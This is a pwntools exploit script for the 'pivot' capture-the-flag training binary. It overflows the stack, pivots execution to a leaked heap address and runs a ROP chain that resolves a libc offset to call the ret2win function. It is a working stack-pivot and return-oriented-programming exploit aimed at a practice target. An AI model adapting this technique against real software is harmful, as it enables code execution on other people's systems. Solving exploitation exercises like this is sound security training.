from pwn import *

binary = ELF("./pivot")
libc = ELF("./libpivot.so")
context.binary = binary

p = process(binary.path)

# addresses
pop_rax = 0x004009bb
xchg_rsp_rax = 0x004009bd

foothold_plt = 0x00400720
foothold_got = 0x00601040

mov_rax = 0x004009c0
add_rax = 0x004009c4
pop_rbp = 0x004007c8
call_rax = 0x004006b0

#pid = util.proc.pidof(p)[0]
#print(f"the pid is {pid}")
#util.proc.wait_for_debugger(pid)

p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot:")
raw_heap_addr = p.recvline().strip().decode("utf-8")
heap_addr = u64(unhex(raw_heap_addr[2:]).rjust(8, b"\x00"), endian="big")

log.info(f"heap address: {hex(heap_addr)}")

ret2win_offset = libc.sym["ret2win"] - libc.sym["foothold_function"]
#foothold_plt = p.elf.plt["foothold_function"]
#foothold_got = p.elf.got["foothold_function"]


stage2 = p64(foothold_plt)
stage2 += p64(pop_rax)
stage2 += p64(foothold_got)
stage2 += p64(mov_rax)
stage2 += p64(pop_rbp)
stage2 += p64(ret2win_offset)
stage2 += p64(add_rax)
stage2 += p64(call_rax)

# pivoted rop chain to heap address
p.recvuntil(b"> ")
p.sendline(stage2)

# stack smash
p.recvuntil(b"> ")

stage1 = b"A" * 40
stage1 += p64(pop_rax)
stage1 += p64(heap_addr)
stage1 += p64(xchg_rsp_rax)
p.sendline(stage1)

print(p.recvall())
